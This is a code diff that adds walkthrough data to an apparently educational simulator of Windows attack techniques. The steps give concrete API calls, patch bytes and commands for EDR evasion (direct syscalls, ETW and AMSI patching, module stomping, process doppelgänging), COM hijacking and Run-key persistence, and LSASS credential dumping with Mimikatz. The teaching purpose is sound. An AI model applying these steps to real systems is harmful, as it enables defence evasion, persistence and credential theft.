@@ -600,16 +600,627 @@ UNHOOK_STEPS = [
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Process Doppelgänging walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+DOPPELGANGING_STEPS = [
+    (0, "Create NTFS transaction",
+     "CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL)\n"
+     "  → hTransaction = 0x000000C8\n\n"
+     "  An NTFS kernel transaction is now open.\n"
+     "  Any file operations performed with this handle operate in\n"
+     "  an isolated, uncommitted view — invisible to other processes."),
+
+    (1, "Open host file within transaction",
+     "CreateFileTransactedW(\n"
+     "    L'C:\\\\Windows\\\\System32\\\\svchost.exe',\n"
+     "    GENERIC_WRITE | GENERIC_READ,\n"
+     "    0, NULL, OPEN_EXISTING,\n"
+     "    FILE_ATTRIBUTE_NORMAL, NULL,\n"
+     "    hTransaction, NULL, NULL\n"
+     ")\n"
+     "  → hTransactedFile = 0x000000D0\n\n"
+     "  [ Disk state — unchanged ]\n"
+     "  svchost.exe = [legitimate Microsoft binary, SHA256=AABBCC...]\n\n"
+     "  [ Transaction view ]\n"
+     "  svchost.exe = [same — not yet modified]"),
+
+    (2, "Write malicious PE into transaction",
+     "WriteFile(hTransactedFile, maliciousPE, payloadSize, &written, NULL)\n"
+     "  → written = 143,360 bytes\n\n"
+     "  [ Disk state — STILL unchanged ]\n"
+     "  svchost.exe = [legitimate Microsoft binary]\n\n"
+     "  [ Transaction view — MODIFIED ]\n"
+     "  svchost.exe = [malicious PE — visible only within this transaction]"),
+
+    (3, "Create image section from transacted file",
+     "NtCreateSection(\n"
+     "    &hSection,\n"
+     "    SECTION_ALL_ACCESS,\n"
+     "    NULL, NULL,\n"
+     "    PAGE_READONLY,\n"
+     "    SEC_IMAGE,           ← map as executable image\n"
+     "    hTransactedFile      ← uses transaction's view\n"
+     ")\n"
+     "  → hSection = 0x000000E0\n"
+     "  → Section created from the MALICIOUS transacted content\n"
+     "  → This section is now INDEPENDENT of the file on disk"),
+
+    (4, "Roll back transaction — disk reverts",
+     "RollbackTransaction(hTransaction)\n"
+     "  → STATUS_SUCCESS\n\n"
+     "  [ Disk state — RESTORED ]\n"
+     "  svchost.exe = [legitimate Microsoft binary — malicious write GONE]\n\n"
+     "  [ Section hSection — UNCHANGED ]\n"
+     "  Still contains the malicious PE image\n"
+     "  The kernel section object is decoupled from the file after creation."),
+
+    (5, "Create process from the malicious section",
+     "NtCreateProcessEx(\n"
+     "    &hProcess,\n"
+     "    PROCESS_ALL_ACCESS,\n"
+     "    NULL,\n"
+     "    GetCurrentProcess(),\n"
+     "    0,\n"
+     "    hSection,            ← malicious image\n"
+     "    NULL, NULL, FALSE\n"
+     ")\n"
+     "  → hProcess = 0x000000F0  (PID = 5512)\n\n"
+     "  PEB.ImageBaseAddress → malicious PE\n"
+     "  PEB.ProcessParameters.ImagePathName → 'C:\\Windows\\System32\\svchost.exe'\n"
+     "  Task Manager shows: svchost.exe  ← looks completely legitimate"),
+
+    (6, "Create thread at entry point + execute",
+     "NtCreateThreadEx(hProcess, AddressOfEntryPoint)\n"
+     "  → Thread starts — malicious payload executes\n\n"
+     "  ✓ On-disk file: clean (transaction rolled back)\n"
+     "  ✓ Process name: svchost.exe (legitimate)\n"
+     "  ✓ Image path: C:\\Windows\\System32\\svchost.exe\n"
+     "  ✓ Disk hash: matches legitimate Microsoft binary\n"
+     "  ✗ Running code: malicious PE\n\n"
+     "  Note: Windows 10 1803+ blocks SEC_IMAGE on transacted files (KB4093119)"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Heaven's Gate walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+HEAVENS_GATE_STEPS = [
+    (0, "WOW64 architecture overview",
+     "  32-bit process on 64-bit Windows — WOW64 layer:\n\n"
+     "  [ 32-bit process address space ]\n"
+     "  0x00400000  app.exe (32-bit)\n"
+     "  0x77800000  ntdll.dll (32-bit)  ← EDR hooks live HERE\n"
+     "  0x77A00000  wow64.dll\n"
+     "  0x77B00000  wow64win.dll\n"
+     "  0x7FFE0000  KUSER_SHARED_DATA\n\n"
+     "  [ 64-bit address space — same process, higher addresses ]\n"
+     "  0x7FFB_0000_0000  ntdll.dll (64-bit)  ← clean stubs here"),
+
+    (1, "Confirm WOW64 and locate 64-bit NTDLL",
+     "IsWow64Process(GetCurrentProcess(), &isWow64)\n"
+     "  → isWow64 = TRUE\n\n"
+     "Read TEB64 from FS:[0xC0] (WOW64 stores 64-bit TEB pointer here):\n"
+     "  → TEB64 @ 0x7F_FF80_0000\n"
+     "  → PEB64 @ TEB64[0x60] = 0x7F_FF81_0000\n"
+     "  → PEB64.Ldr → walk InMemoryOrderModuleList\n"
+     "  → ntdll64 base = 0x7FFB_DD00_0000"),
+
+    (2, "Find target syscall stub in 64-bit NTDLL",
+     "Walk ntdll64 export table for 'NtAllocateVirtualMemory':\n"
+     "  → RVA = 0x0000A180\n"
+     "  → VA  = 0x7FFB_DD00_A180\n\n"
+     "  Read stub bytes:\n"
+     "  7FFB_DD00_A180:  4C 8B D1     mov r10, rcx\n"
+     "  7FFB_DD00_A183:  B8 18 00 00  mov eax, 0x18   ← SSN = 0x18\n"
+     "  7FFB_DD00_A187:  00 0F 05     syscall\n"
+     "  7FFB_DD00_A18A:  C3           ret\n\n"
+     "  SSN = 0x18  (not hooked — 32-bit EDR only patches 32-bit stubs)"),
+
+    (3, "Prepare far JMP to selector 0x33",
+     "  CPU segment selectors:\n"
+     "  0x23 = 32-bit compatibility mode (current)\n"
+     "  0x33 = 64-bit long mode (target)\n\n"
+     "  Craft the far JMP target:\n"
+     "  FAR_JMP_PTR = { offset = &gate64, selector = 0x33 }\n\n"
+     "  gate64 is the label in 64-bit code we want to jump to\n"
+     "  After the far JMP, the CPU switches to 64-bit mode"),
+
+    (4, "Execute far JMP and syscall",
+     "  [ 32-bit code ]\n"
+     "  mov eax, 0x18         ; SSN for NtAllocateVirtualMemory\n"
+     "  jmp far [FAR_JMP_PTR] ; CS = 0x33 → switch to 64-bit mode\n\n"
+     "  ─── CPU switches to 64-bit long mode ───────────────────────\n\n"
+     "  [ 64-bit code — gate64 label ]\n"
+     "  mov r10, rcx          ; per Windows x64 ABI\n"
+     "  syscall               ; enter kernel — SSN 0x18\n\n"
+     "  The kernel handles the call.\n"
+     "  32-bit ntdll hook was NEVER invoked."),
+
+    (5, "Return to 32-bit mode",
+     "  After syscall returns:\n"
+     "  far jmp [return_ptr]  ; selector = 0x23 → back to 32-bit\n\n"
+     "  ─── CPU switches back to 32-bit ────────────────────────────\n\n"
+     "  [ 32-bit code resumes ]\n"
+     "  EAX = NTSTATUS result from kernel\n\n"
+     "  ✓ Syscall completed successfully\n"
+     "  ✓ 32-bit ntdll hooks bypassed completely\n"
+     "  ✓ EDR's 32-bit monitoring layer saw nothing"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Direct Syscalls / Hell's Gate walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+DIRECT_SYSCALL_STEPS = [
+    (0, "Why NTDLL stubs are hooked",
+     "  [ Normal API call flow ]\n"
+     "  app.exe → ntdll!NtAllocateVirtualMemory → syscall → kernel\n\n"
+     "  [ With EDR hook ]\n"
+     "  app.exe → ntdll!NtAllocateVirtualMemory\n"
+     "               ↓  [first 5 bytes = JMP to EDR]\n"
+     "               → EDR.dll!HookHandler  ← inspects args\n"
+     "               → original stub\n"
+     "               → syscall → kernel\n\n"
+     "  Goal: call the kernel directly, skip ntdll entirely."),
+
+    (1, "Locate ntdll in memory (no GetModuleHandle)",
+     "Walk PEB.Ldr.InMemoryOrderModuleList:\n"
+     "  Entry[0] = ntdll.dll  base = 0x7FFB_DD00_0000\n\n"
+     "  (Using PEB walk avoids calling any potentially-hooked API)"),
+
+    (2, "Find target function and read SSN",
+     "Walk ntdll export table for 'NtAllocateVirtualMemory':\n"
+     "  → RVA = 0xA180   VA = 0x7FFB_DD00_A180\n\n"
+     "  Read first bytes:\n"
+     "  Case A — CLEAN stub:\n"
+     "    4C 8B D1        mov r10, rcx\n"
+     "    B8 18 00 00 00  mov eax, 0x18   ← SSN = 0x18\n"
+     "    0F 05           syscall\n"
+     "    C3              ret\n\n"
+     "  Case B — HOOKED (Hell's Gate needed):\n"
+     "    E9 XX XX XX XX  jmp EDRHook    ← SSN not visible!"),
+
+    (3, "Hell's Gate: infer SSN from neighbours",
+     "  [ Hooked stub detected at NtAllocateVirtualMemory ]\n"
+     "  E9 ... JMP found at offset 0 — EDR hook present\n\n"
+     "  Scan FORWARD through export table:\n"
+     "  NtAlertResumeThread  +32 bytes → B8 19 00 00 00  SSN=0x19 (clean)\n"
+     "  NtAlertThread        +64 bytes → B8 1A 00 00 00  SSN=0x1A (clean)\n\n"
+     "  Inference:\n"
+     "  NtAllocateVirtualMemory SSN = 0x19 - 1 = 0x18  ✓\n\n"
+     "  Hell's Gate recovers SSN even when the target stub is hooked."),
+
+    (4, "Build inline syscall stub",
+     "  Embed stub bytes directly in your code:\n\n"
+     "  unsigned char stub[] = {\n"
+     "      0x4C, 0x8B, 0xD1,              // mov r10, rcx\n"
+     "      0xB8, 0x18, 0x00, 0x00, 0x00,  // mov eax, SSN (patched at runtime)\n"
+     "      0x0F, 0x05,                    // syscall\n"
+     "      0xC3                           // ret\n"
+     "  };\n\n"
+     "  Patch stub[4..7] with the resolved SSN at runtime.\n"
+     "  Mark stub memory PAGE_EXECUTE_READ before calling."),
+
+    (5, "Execute and verify",
+     "  Call stub as a function pointer:\n"
+     "  NTSTATUS st = ((NTAPI_ALLOC)stub)(\n"
+     "      GetCurrentProcess(), &base, 0,\n"
+     "      &size, MEM_COMMIT, PAGE_READWRITE);\n\n"
+     "  → NTSTATUS = 0x00000000 (STATUS_SUCCESS)\n"
+     "  → base = 0x00270000\n\n"
+     "  ✓ Allocation succeeded via direct syscall\n"
+     "  ✓ ntdll stub never called\n"
+     "  ✓ EDR hook never triggered\n"
+     "  ✓ Stack trace shows return into your code, not ntdll"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Module Stomping walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+MODULE_STOMPING_STEPS = [
+    (0, "Why file-backed memory is trusted",
+     "  [ Memory region types ]\n"
+     "  Private / anonymous:   suspicious if executable  ← EDR flags this\n"
+     "  File-backed (module):  trusted — maps to a DLL on disk\n\n"
+     "  Security tools check VAD (Virtual Address Descriptor) entries:\n"
+     "  addr=0x6C000000  type=IMAGE  file=clrjit.dll  → TRUSTED\n"
+     "  addr=0x00C00000  type=PRIVATE  file=<none>    → SUSPICIOUS\n\n"
+     "  Module Stomping abuses this by putting shellcode\n"
+     "  inside a region that is still VAD-mapped to a real file."),
+
+    (1, "Load target DLL without running DllMain",
+     "LoadLibraryExW(\n"
+     "    L'C:\\Windows\\Microsoft.NET\\...\\clrjit.dll',\n"
+     "    NULL,\n"
+     "    DONT_RESOLVE_DLL_REFERENCES  ← no DllMain, no imports\n"
+     ")\n"
+     "  → hMod = 0x6C000000\n\n"
+     "  [ VAD entry ]\n"
+     "  0x6C000000  PAGE_EXECUTE_READ  IMAGE  clrjit.dll\n\n"
+     "  clrjit.dll .text  @ 0x6C001000  size = 0x9A000"),
+
+    (2, "Locate .text section",
+     "Parse PE headers of loaded clrjit.dll:\n"
+     "  IMAGE_NT_HEADERS @ 0x6C000108\n"
+     "  Section .text:\n"
+     "    VirtualAddress = 0x00001000\n"
+     "    VirtualSize    = 0x0009A000\n"
+     "    Characteristics = EXECUTE | READ\n\n"
+     "  .text base = 0x6C000000 + 0x1000 = 0x6C001000\n"
+     "  Available space = 630,784 bytes  (shellcode will fit)"),
+
+    (3, "VirtualProtect .text → RWX",
+     "VirtualProtect(0x6C001000, scLen, PAGE_EXECUTE_READWRITE, &old)\n"
+     "  → old = PAGE_EXECUTE_READ\n\n"
+     "  [ VAD entry — still shows clrjit.dll! ]\n"
+     "  0x6C000000  PAGE_EXECUTE_READWRITE  IMAGE  clrjit.dll\n\n"
+     "  Note: RWX is briefly anomalous — the next step fixes this."),
+
+    (4, "Overwrite .text with shellcode",
+     "memcpy(0x6C001000, shellcode, scLen)\n"
+     "  → Shellcode written to clrjit.dll .text section\n\n"
+     "VirtualProtect(0x6C001000, scLen, PAGE_EXECUTE_READ, &old)\n"
+     "  → Restored to PAGE_EXECUTE_READ — RWX anomaly gone\n\n"
+     "  [ Memory content @ 0x6C001000 ]\n"
+     "  On disk (clrjit.dll): FC 48 83 E4 F0 ... (legitimate code)\n"
+     "  In memory:            90 90 90 E8 ...    (shellcode)"),
+
+    (5, "Execute — appears to be legitimate DLL code",
+     "((void(*)())0x6C001000)()\n"
+     "  → Shellcode executes\n\n"
+     "  [ What security tools see ]\n"
+     "  Thread RIP = 0x6C001000\n"
+     "  VAD:         0x6C000000  IMAGE  clrjit.dll\n"
+     "  File check:  C:\\...\\clrjit.dll  (hash = legitimate)\n\n"
+     "  ✓ Memory appears to be the real clrjit.dll\n"
+     "  ✓ No anonymous RX pages\n"
+     "  ✗ In-memory content doesn't match disk — pe-sieve catches this"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ETW Patching walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+ETW_PATCH_STEPS = [
+    (0, "ETW architecture",
+     "  [ ETW event flow ]\n"
+     "  Provider (ntdll, CLR, PS) → EtwEventWrite() → ETW kernel buffer\n"
+     "      → ETW consumer (Defender, EDR, Event Log)\n\n"
+     "  EtwEventWrite @ ntdll.dll + 0xA3F20:\n"
+     "    48 8B C4        mov rax, rsp\n"
+     "    48 89 58 08     mov [rax+8], rbx\n"
+     "    ... (writes event to kernel)\n\n"
+     "  Patching this to RET stops ALL events before they reach the kernel."),
+
+    (1, "Resolve EtwEventWrite address",
+     "GetProcAddress(GetModuleHandleA('ntdll.dll'), 'EtwEventWrite')\n"
+     "  → 0x7FFB_DD00_A3F20\n\n"
+     "  Current bytes @ 0x7FFB_DD00_A3F20:\n"
+     "  48 8B C4  mov rax, rsp\n"
+     "  48 89 58  mov [rax+8], rbx\n"
+     "  08 4C 89  mov [rax+16], rsi\n"
+     "  ..."),
+
+    (2, "VirtualProtect → writable",
+     "VirtualProtect(0x7FFB_DD00_A3F20, 1,\n"
+     "               PAGE_EXECUTE_READWRITE, &old)\n"
+     "  → old = PAGE_EXECUTE_READ\n"
+     "  → Function is now writable"),
+
+    (3, "Write RET patch",
+     "*(BYTE*)0x7FFB_DD00_A3F20 = 0xC3  // RET\n\n"
+     "  Bytes @ 0x7FFB_DD00_A3F20 AFTER patch:\n"
+     "  C3  ret    ← immediately returns, does nothing\n"
+     "  8B C4      (rest of function, never reached)\n"
+     "  48 89 58\n"
+     "  ..."),
+
+    (4, "Restore page protection",
+     "VirtualProtect(0x7FFB_DD00_A3F20, 1, PAGE_EXECUTE_READ, &old)\n"
+     "  → Restored to RX — no more RWX anomaly"),
+
+    (5, "Effect: all ETW events silenced",
+     "  [ After patch — ETW call trace ]\n"
+     "  Provider → EtwEventWrite()\n"
+     "      → C3 (RET)  ← returns immediately\n"
+     "      → Event NEVER reaches ETW kernel buffer\n"
+     "      → Defender/EDR consumer sees NOTHING\n\n"
+     "  Affected telemetry:\n"
+     "  ✓ Windows Defender AMSI events\n"
+     "  ✓ PowerShell ScriptBlock logging\n"
+     "  ✓ .NET runtime events\n"
+     "  ✓ EDR behavioral telemetry (via user-mode ETW)\n\n"
+     "  NOT affected (kernel ETW):\n"
+     "  ✗ PsSetCreateProcessNotifyRoutine\n"
+     "  ✗ Kernel ETW-TI provider"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# AMSI Bypass walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+AMSI_STEPS = [
+    (0, "AMSI architecture",
+     "  [ AMSI scan flow — normal ]\n"
+     "  PowerShell/WSH/CLR → AmsiScanBuffer(ctx, buf, len)\n"
+     "      → amsi.dll → AV provider (via COM)\n"
+     "      → returns AMSI_RESULT_DETECTED (32768) or AMSI_RESULT_CLEAN (1)\n\n"
+     "  amsi.dll is loaded into every script host process.\n"
+     "  AmsiScanBuffer is the single chokepoint for ALL script content."),
+
+    (1, "Resolve AmsiScanBuffer",
+     "GetModuleHandleA('amsi.dll')  → 0x7FFA_E000_0000\n"
+     "GetProcAddress(amsi, 'AmsiScanBuffer')  → 0x7FFA_E000_1A20\n\n"
+     "  Original bytes @ 0x7FFA_E000_1A20:\n"
+     "  4C 8B DC    mov r11, rsp\n"
+     "  49 89 53 08 mov [r11+8], rdx\n"
+     "  49 89 4B 10 mov [r11+16], rcx\n"
+     "  ..."),
+
+    (2, "VirtualProtect → writable",
+     "VirtualProtect(0x7FFA_E000_1A20, 6,\n"
+     "               PAGE_EXECUTE_READWRITE, &old)\n"
+     "  → old = PAGE_EXECUTE_READ"),
+
+    (3, "Write patch bytes",
+     "  Patch: MOV EAX, 0x80070057 + RET\n"
+     "  Bytes: B8 57 00 07 80 C3\n\n"
+     "memcpy(0x7FFA_E000_1A20, patch, 6)\n\n"
+     "  Patched bytes @ 0x7FFA_E000_1A20:\n"
+     "  B8 57 00 07 80  mov eax, 0x80070057  (E_INVALIDARG)\n"
+     "  C3              ret\n"
+     "  (rest of function never reached)"),
+
+    (4, "Restore protection",
+     "VirtualProtect(0x7FFA_E000_1A20, 6, PAGE_EXECUTE_READ, &old)\n"
+     "  → Restored"),
+
+    (5, "AMSI bypassed — scan result is always clean",
+     "  [ Patched scan call trace ]\n"
+     "  AmsiScanBuffer(ctx, 'Invoke-Mimikatz', len, ...)\n"
+     "      → B8 57 00 07 80  mov eax, 0x80070057\n"
+     "      → C3              ret\n"
+     "      → caller receives E_INVALIDARG → treated as CLEAN\n\n"
+     "  ✓ 'Invoke-Mimikatz' passes AMSI scan\n"
+     "  ✓ Malicious .NET assemblies load without scan\n"
+     "  ✓ Obfuscated shellcode executes undetected\n\n"
+     "  Covers:\n"
+     "  ✓ PowerShell script scanning\n"
+     "  ✓ WMI script scanning\n"
+     "  ✓ .NET assembly scanning (AMSI for CLR)\n"
+     "  ✓ COM Scriptlet scanning"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# COM Hijacking walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+COM_HIJACK_STEPS = [
+    (0, "COM object lookup order",
+     "  When CoCreateInstance({CLSID}) is called, Windows searches:\n\n"
+     "  1. HKCU\\Software\\Classes\\CLSID\\{...}\\InprocServer32\n"
+     "     → if found: load this DLL  ← attacker writes here\n\n"
+     "  2. HKLM\\Software\\Classes\\CLSID\\{...}\\InprocServer32\n"
+     "     → if found: load this DLL  ← legitimate registration\n\n"
+     "  HKCU requires NO admin privileges — any user can write it.\n"
+     "  HKCU takes precedence over HKLM."),
+
+    (1, "Identify hijackable CLSIDs with ProcMon",
+     "  ProcMon filter: Operation = RegOpenKey  Result = NAME NOT FOUND\n"
+     "  Path contains: HKCU\\...\\CLSID\n\n"
+     "  Results (Explorer.exe):\n"
+     "  HKCU\\Software\\Classes\\CLSID\\{BCDE0395-...}  NAME NOT FOUND ← hijackable!\n"
+     "  HKCU\\Software\\Classes\\CLSID\\{D63B10C5-...}  NAME NOT FOUND ← hijackable!\n\n"
+     "  These CLSIDs are instantiated by Explorer but only registered in HKLM."),
+
+    (2, "Register malicious DLL in HKCU",
+     "RegCreateKeyExW(HKCU,\n"
+     "    'Software\\Classes\\CLSID\\{BCDE0395-...}\\InprocServer32')\n\n"
+     "RegSetValueExW(hKey, NULL, REG_SZ,\n"
+     "    L'C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll')\n\n"
+     "RegSetValueExW(hKey, L'ThreadingModel', REG_SZ, L'Apartment')\n\n"
+     "  [ HKCU registry — after install ]\n"
+     "  HKCU\\Software\\Classes\\CLSID\\{BCDE0395-...}\\\n"
+     "    InprocServer32\\\n"
+     "      (default) = C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll\n"
+     "      ThreadingModel = Apartment"),
+
+    (3, "Trigger: application starts and instantiates COM object",
+     "  [ Next time Explorer.exe starts ]\n"
+     "  CoCreateInstance({BCDE0395-...})\n"
+     "    → COM runtime looks up CLSID\n"
+     "    → Checks HKCU first\n"
+     "    → FOUND: C:\\Users\\user\\AppData\\Local\\Temp\\payload.dll\n"
+     "    → LoadLibrary('...\\payload.dll')\n"
+     "    → DllMain(DLL_PROCESS_ATTACH) ← your payload runs here"),
+
+    (4, "Persistence and privilege context",
+     "  payload.dll runs INSIDE Explorer.exe:\n"
+     "  ✓ Explorer's integrity level (Medium)\n"
+     "  ✓ Explorer's user context\n"
+     "  ✓ All Explorer's open handles and tokens\n\n"
+     "  Persistence:\n"
+     "  ✓ Registry key survives reboot\n"
+     "  ✓ Fires every time the target app starts\n"
+     "  ✓ No new processes created\n"
+     "  ✓ No scheduled tasks or services needed\n\n"
+     "  Cleanup: RegDeleteTreeW(HKCU, 'Software\\Classes\\CLSID\\{BCDE0395-...}')"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Registry Run Key Persistence walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+REGISTRY_PERSIST_STEPS = [
+    (0, "Run key locations overview",
+     "  Registry autorun locations (most common):\n\n"
+     "  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
+     "    → Runs for current user on logon  (no admin needed)\n\n"
+     "  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
+     "    → Runs for ALL users on logon  (admin required)\n\n"
+     "  HKCU\\...\\RunOnce\n"
+     "    → Runs once, then deletes itself\n\n"
+     "  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n"
+     "    → Userinit / Shell values  (more stealthy, admin)"),
+
+    (1, "Open the Run key",
+     "RegOpenKeyExA(\n"
+     "    HKEY_CURRENT_USER,\n"
+     "    'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',\n"
+     "    0, KEY_WRITE, &hKey\n"
+     ")\n"
+     "  → hKey = 0x00000080\n"
+     "  → Key opened for writing (no admin required for HKCU)"),
+
+    (2, "Write the persistence value",
+     "RegSetValueExA(\n"
+     "    hKey,\n"
+     "    'WindowsUpdateHelper',       ← masquerades as update service\n"
+     "    0,\n"
+     "    REG_SZ,\n"
+     "    'C:\\Users\\user\\AppData\\Roaming\\svcupdate.exe',\n"
+     "    pathLen\n"
+     ")\n"
+     "  → ERROR_SUCCESS\n\n"
+     "  [ HKCU Run key after install ]\n"
+     "  OneDrive      = C:\\Users\\user\\AppData\\...\\OneDrive.exe\n"
+     "  WindowsUpdateHelper = C:\\...\\AppData\\Roaming\\svcupdate.exe  ← NEW"),
+
+    (3, "User logs off and back on",
+     "  Windows reads Run key at logon:\n"
+     "  1. OneDrive.exe  → starts normally\n"
+     "  2. svcupdate.exe → starts payload\n\n"
+     "  Payload runs with user's token and privileges\n"
+     "  No UAC prompt\n"
+     "  No visible window (if compiled as SUBSYSTEM:WINDOWS)"),
+
+    (4, "Alternative: Scheduled Task",
+     "  Run keys are heavily monitored — scheduled tasks are stealthier:\n\n"
+     "  schtasks /create\n"
+     "      /tn 'MicrosoftEdgeUpdateCore'\n"
+     "      /tr 'C:\\...\\svcupdate.exe'\n"
+     "      /sc onlogon\n"
+     "      /rl highest\n"
+     "      /f\n\n"
+     "  Advantages over Run keys:\n"
+     "  ✓ Harder to spot in Autoruns without known-bad heuristics\n"
+     "  ✓ More trigger options (on idle, on event, repeating)\n"
+     "  ✓ Can run elevated (/rl highest)"),
+
+    (5, "Cleanup",
+     "RegDeleteValueA(hKey, 'WindowsUpdateHelper')\n"
+     "  → ERROR_SUCCESS — value removed\n\n"
+     "  [ HKCU Run key after cleanup ]\n"
+     "  OneDrive = C:\\Users\\user\\AppData\\...\\OneDrive.exe\n"
+     "  (WindowsUpdateHelper entry is gone)\n\n"
+     "  For scheduled task: schtasks /delete /tn 'MicrosoftEdgeUpdateCore' /f"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# LSASS Dumping walkthrough
+# ─────────────────────────────────────────────────────────────────────────────
+
+LSASS_STEPS = [
+    (0, "What lives in LSASS memory",
+     "  lsass.exe — Local Security Authority Subsystem Service\n\n"
+     "  Credential caches in memory:\n"
+     "  ┌─────────────────────────────────────────────────────┐\n"
+     "  │ MSV1_0 (NTLM)   → NTLM hash + LM hash              │\n"
+     "  │ Kerberos        → TGT, service tickets, session key │\n"
+     "  │ WDigest         → cleartext (if reg key enabled)    │\n"
+     "  │ LiveSSP         → Microsoft account credentials     │\n"
+     "  │ DPAPI           → master keys for encrypted data    │\n"
+     "  └─────────────────────────────────────────────────────┘\n\n"
+     "  Target: dump lsass.exe memory → offline processing → credentials"),
+
+    (1, "Enable SeDebugPrivilege",
+     "OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)\n"
+     "LookupPrivilegeValue(NULL, 'SeDebugPrivilege', &luid)\n"
+     "AdjustTokenPrivileges(hToken, FALSE, &tp, ...)\n\n"
+     "  → SeDebugPrivilege ENABLED\n"
+     "  → Can now open any process regardless of DACL\n"
+     "  (Requires local admin — standard user cannot enable SeDebugPrivilege)"),
+
+    (2, "Find LSASS PID",
+     "CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)\n"
+     "  Walk process list:\n"
+     "  PID=4     System\n"
+     "  PID=512   smss.exe\n"
+     "  PID=632   csrss.exe\n"
+     "  PID=700   lsass.exe   ← FOUND\n"
+     "  PID=844   svchost.exe\n"
+     "  ...\n"
+     "  → LSASS PID = 700"),
+
+    (3, "OpenProcess on LSASS",
+     "OpenProcess(\n"
+     "    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,\n"
+     "    FALSE, 700\n"
+     ")\n"
+     "  → hLsass = 0x000000A4\n\n"
+     "  Note: on Windows 10+ with PPL enabled:\n"
+     "  → OpenProcess returns ERROR_ACCESS_DENIED\n"
+     "  → Need kernel driver or PPL bypass to proceed"),
+
+    (4, "MiniDumpWriteDump",
+     "hFile = CreateFile('C:\\Windows\\Temp\\lsass.dmp', GENERIC_WRITE, ...)\n\n"
+     "MiniDumpWriteDump(\n"
+     "    hLsass,          ← LSASS handle\n"
+     "    700,             ← PID\n"
+     "    hFile,           ← output file\n"
+     "    MiniDumpWithFullMemory,\n"
+     "    NULL, NULL, NULL\n"
+     ")\n"
+     "  → TRUE — dump written\n"
+     "  → File size: ~60 MB (full LSASS memory)"),
+
+    (5, "Offline processing with Mimikatz",
+     "  Transfer lsass.dmp to attacker machine, then:\n\n"
+     "  mimikatz # sekurlsa::minidump lsass.dmp\n"
+     "  mimikatz # sekurlsa::logonpasswords\n\n"
+     "  Output:\n"
+     "  Authentication Id : 0 ; 999 (00000000:000003e7)\n"
+     "  Session           : Interactive from 1\n"
+     "  UserName          : Administrator\n"
+     "  Domain            : CORP\n"
+     "  Logon Server      : DC01\n"
+     "  NTLM              : e19ccf75ee54e06b06a5907af13cef42  ← crack or PTH\n"
+     "  Kerberos TGT      : [ticket data]  ← Pass-the-Ticket\n\n"
+     "  Defense: Enable Credential Guard (moves secrets into VSM)\n"
+     "           Enable RunAsPPL for LSASS (blocks OpenProcess)"),
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Step data registry
 # ─────────────────────────────────────────────────────────────────────────────
 
 SIMULATION_STEPS = {
-    "iat_hooking":          IAT_STEPS,
-    "classic_dll_injection": DLL_INJECTION_STEPS,
-    "process_hollowing":    HOLLOWING_STEPS,
-    "apc_injection":        APC_STEPS,
-    "thread_hijacking":     HIJACK_STEPS,
-    "reflective_dll":       REFLECTIVE_STEPS,
-    "atom_bombing":         ATOM_STEPS,
-    "ntdll_unhooking":      UNHOOK_STEPS,
+    "iat_hooking":            IAT_STEPS,
+    "classic_dll_injection":  DLL_INJECTION_STEPS,
+    "process_hollowing":      HOLLOWING_STEPS,
+    "apc_injection":          APC_STEPS,
+    "thread_hijacking":       HIJACK_STEPS,
+    "reflective_dll":         REFLECTIVE_STEPS,
+    "atom_bombing":           ATOM_STEPS,
+    "ntdll_unhooking":        UNHOOK_STEPS,
+    "process_doppelganging":  DOPPELGANGING_STEPS,
+    "heavens_gate":           HEAVENS_GATE_STEPS,
+    "direct_syscalls":        DIRECT_SYSCALL_STEPS,
+    "module_stomping":        MODULE_STOMPING_STEPS,
+    "etw_patching":           ETW_PATCH_STEPS,
+    "amsi_bypass":            AMSI_STEPS,
+    "com_hijacking":          COM_HIJACK_STEPS,
+    "registry_persistence":   REGISTRY_PERSIST_STEPS,
+    "lsass_dumping":          LSASS_STEPS,
 }
